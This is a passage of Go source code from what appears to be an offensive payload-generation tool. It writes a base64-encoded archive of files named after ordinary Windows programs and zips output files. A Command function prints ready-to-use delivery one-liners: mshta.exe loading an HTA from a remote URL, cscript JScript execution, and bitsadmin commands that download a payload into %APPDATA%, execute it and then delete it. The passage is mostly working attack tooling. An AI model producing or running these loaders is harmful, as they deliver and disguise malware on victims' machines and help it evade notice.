oIcr6AwY2bEjAfkOGXCpQYpPplxqUGKS7DtjOEMkBhEAFD4IwMmuGqECD+QRIojAFBLAQIeAxQAAAAIALiGaVTa2lxSCwEAAK8CAAAKABgAAAAAAAAAAAC0gQAAAABBcHB3aXouZXhwVVQFAAOb2yhidXgLAAEE6AMAAAToAwAAUEsBAh4DFAAAAAgAuIZpVGaOd0kPAQAAswIAAA4AGAAAAAAAAAAAALSBTwEAAENhbGN1bGF0b3IuZXhwVVQFAAOb2yhidXgLAAEE6AMAAAToAwAAUEsBAh4DFAAAAAgAuIZpVM+2ZwYOAQAAswIAAAwAGAAAAAAAAAAAALSBpgIAAENhbGVuZGFyLmV4cFVUBQADm9soYnV4CwABBOgDAAAE6AMAAFBLAQIeAxQAAAAIALiGaVTFzvJ2CAEAAK8CAAAIABgAAAAAAAAAAAC0gfoDAABEZXNrLmV4cFVUBQADm9soYnV4CwABBOgDAAAE6AMAAFBLAQIeAxQAAAAIALiGaVQXe7ldCQEAAK8CAAAIABgAAAAAAAAAAAC0gUQFAABNZW1vLmV4cFVUBQADm9soYnV4CwABBOgDAAAE6AMAAFBLAQIeAxQAAAAIALiGaVQYZuuGDAEAAK8CAAALABgAAAAAAAAAAAC0gY8GAABSZXBvcnRzLmV4cFVUBQADm9soYnV4CwABBOgDAAAE6AMAAFBLAQIeAxQAAAAIALiGaVQKim3FDwEAALMCAAANABgAAAAAAAAAAAC0geAHAABUaW1lc2hlZXQuZXhwVVQFAAOb2yhidXgLAAEE6AMAAAToAwAAUEsBAh4DFAAAAAgAuIZpVO/hU/8LAQAArwIAAAsAGAAAAAAAAAAAALSBNgkAAFVwZGF0ZXMuZXhwVVQFAAOb2yhidXgLAAEE6AMAAAToAwAAUEsBAh4DFAAAAAgAuIZpVMYXB1AJAQAArwIAAAgAGAAAAAAAAAAAALSBhgoAAFpvb20uZXhwVVQFAAOb2yhidXgLAAEE6AMAAAToAwAAUEsFBgAAAAAJAAkA1QIAANELAAAAAA=="
	}

	dec, err := base64.StdEncoding.DecodeString(base64string)
	if err != nil {
		panic(err)
	}
	f, err := os.Create(name)
	if err != nil {
		panic(err)
	}
	defer f.Close()
	if _, err := f.Write(dec); err != nil {
		panic(err)
	}
	if err := f.Sync(); err != nil {
		panic(err)
	}
}

func Zipit(source, target string) error {
	zipfile, err := os.Create(target)
	if err != nil {
		return err
	}
	defer zipfile.Close()
	archive := zip.NewWriter(zipfile)
	defer archive.Close()
	info, err := os.Stat(source)
	if err != nil {
		return nil
	}
	var baseDir string
	if info.IsDir() {
		baseDir = filepath.Base(source)
	}
	filepath.Walk(source, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		header, err := zip.FileInfoHeader(info)
		if err != nil {
			return err
		}
		if baseDir != "" {
			header.Name = filepath.Join(baseDir, strings.TrimPrefix(path, source))
		}
		if info.IsDir() {
			header.Name += "/"
		} else {
			header.Method = zip.Deflate
		}
		writer, err := archive.CreateHeader(header)
		if err != nil {
			return err
		}
		if info.IsDir() {
			return nil
		}
		file, err := os.Open(path)
		if err != nil {
			return err
		}
		defer file.Close()
		_, err = io.Copy(writer, file)
		return err

	})
	return err
}

func FileMover(pattern string, path string) {
	var matches []string
	if strings.HasSuffix(path, "/") {
	} else {
		path = path + "/"
	}
	if strings.Contains(pattern, ".") {
		matches, _ = filepath.Glob(pattern + "*")

	} else {
		matches, _ = filepath.Glob(pattern + ".*")
	}

	if len(matches) == 0 {
		fmt.Println("Error no file found")
	}
	filename := strings.Join(matches, " ")
	os.Rename(filename, path+filename)
	fmt.Println("[*] " + filename + " moved to " + path)
}

func Command(URL string, CommandLoader string, outFile string) string {

	if URL != "" && CommandLoader == "hta" {
		fmt.Println("[*] HTA Payload")
		fmt.Println("[!] Can be executed manually by a user or embeded into a one liner command that executes it:")
		if strings.HasSuffix(URL, "/") {
			fmt.Println("mshta.exe " + URL + outFile)
		} else {
			fmt.Println("mshta.exe " + URL + "/" + outFile)
		}
	}
	if URL == "" && !strings.Contains(outFile, ".js") && !strings.Contains(outFile, ".hta") {
		fmt.Println(color.GreenString("[+] ") + "Non Executable file extension detected. Either add the extension \".js\" or use the following to execute it (note that this works from a local instance, webdav or fileshare... not a  webserver):")
		fmt.Println("cscript //E:jscript " + outFile + "")
	}
	if URL != "" && CommandLoader == "macro" {
		if strings.HasSuffix(URL, "/") {
		} else {
			URL = URL + "/"
		}
		fmt.Println("[*] Macro Delivery Payload")
		fmt.Println("[!] Excel macro that will download, execute and remove the payload:")
	}

	if URL != "" && CommandLoader == "bits" {
		fmt.Println("[*] Bitsadmin")
		fmt.Println("[!] One liner command to execute it:")
		if !strings.Contains(outFile, ".js") && !strings.Contains(outFile, ".hta") && !strings.Contains(outFile, ".cpl") && !strings.Contains(outFile, ".exe") {
			if strings.HasSuffix(URL, "/") {
				fmt.Println("bitsadmin /transfer " + outFile + " " + URL + outFile + " %APPDATA%\\" + outFile + " & cscript //E: JScript %APPDATA%\\" + outFile + " & timeout 20 & del %APPDATA%\\" + outFile + "")
			} else {
				fmt.Println("bitsadmin /transfer " + outFile + " " + URL + "/" + outFile + " %APPDATA%\\" + outFile + " & cscript //E: JScript %APPDATA%\\" + outFile + " & timeout 20 & del %APPDATA%\\" + outFile + "")
			}
		} else {
			if strings.HasSuffix(URL, "/") {
				fmt.Println("bitsadmin /transfer " + outFile + " " + URL + outFile + " %APPDATA%\\" + outFile + " & %APPDATA%\\" + outFile + " & timeout 20 & del %APPDATA%\\" + outFile + "")
			} else {
				fmt.Println("bitsadmin /transfer " + outFile + " " + URL + "/" + outFile + " %APPDATA%\\" + outFile + " & %APPDATA%\\" + outFile + " & timeout 20 & del %APPDATA%\\" + outFile + "")

			}
		}
	}
	return URL
}
